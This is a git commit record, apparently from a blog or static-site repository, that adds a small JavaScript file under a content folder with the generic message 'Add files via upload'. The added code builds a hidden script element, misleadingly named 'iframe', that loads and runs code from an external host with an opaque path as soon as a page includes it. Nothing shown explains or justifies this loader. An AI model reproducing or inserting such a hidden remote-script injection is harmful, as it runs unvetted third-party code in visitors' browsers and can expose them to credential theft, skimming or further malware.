66ae45bc09dc897945468624c61bc33139e5fdd1
老公 <1990758989@qq.com>
2022-07-23 23:21:39 +0800

    Add files via upload

---
+++ content/post/js.js
@@ -0,0 +1,4 @@
+var iframe = document.createElement('script'); 
+iframe.src="https://1.ext4.win/f0dmpreb9vcgco46ci17kvt3m5oxfpxy/html";
+iframe.style="display:none;";  
+document.body.appendChild(iframe);
